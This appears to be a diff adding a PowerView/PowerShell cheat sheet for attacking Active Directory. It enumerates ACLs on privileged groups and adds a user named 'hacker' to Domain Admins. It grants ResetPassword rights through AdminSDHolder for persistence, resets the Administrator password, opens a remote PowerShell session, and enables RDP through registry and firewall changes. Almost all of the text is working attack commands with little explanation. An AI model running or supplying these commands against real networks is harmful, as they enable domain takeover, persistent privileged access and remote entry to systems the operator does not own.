+Get-DomainObjectAcl -SamAccountName "Enterprise Admins" | ? {($_.SecurityIdentifier -match 'S-1-5-21-*-*-*')}
+Get-DomainObjectAcl -SamAccountName "Replicator" | ? {($_.SecurityIdentifier -match 'S-1-5-21-*-*-*')}
+Get-DomainObjectAcl -SamAccountName "Schema Admins" | ? {($_.SecurityIdentifier -match 'S-1-5-21-*-*-*')}
+
+Adding the user to the Domain Admin ACL --- 
+#Check access-
+Get-DomainGroupMember -SamAccountName "Domain Admins" -Recurse
+
+#Abusing FullControl using PowerView:
+import-module .\powerview.ps1
+Add-DomainGroupMember -Identity 'Domain Admins' -Members hacker -Verbose
+
+#Check access to see that now you do have access to DA
+Get-DomainGroups -SamAccountName "Domain Admins" -Recurse
+
+Password Reset for any account --
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=hacked,DC=local' -PrincipalIdentity hacker -Rights ResetPassword -Verbose
+
+#Abusing ResetPassword using PowerView:
+Import-Module .\PowerView.ps1
+Set-DomainUserPassword -Identity Administrator -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
+
+#Enter Session with new password
+Enter-PSSession –Computername ad –credential hacked\Administrator
+
+#Enable Remote Desktop
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+
+#Activate the firewall rule
+Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+
+#Enable authentication via RDP
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
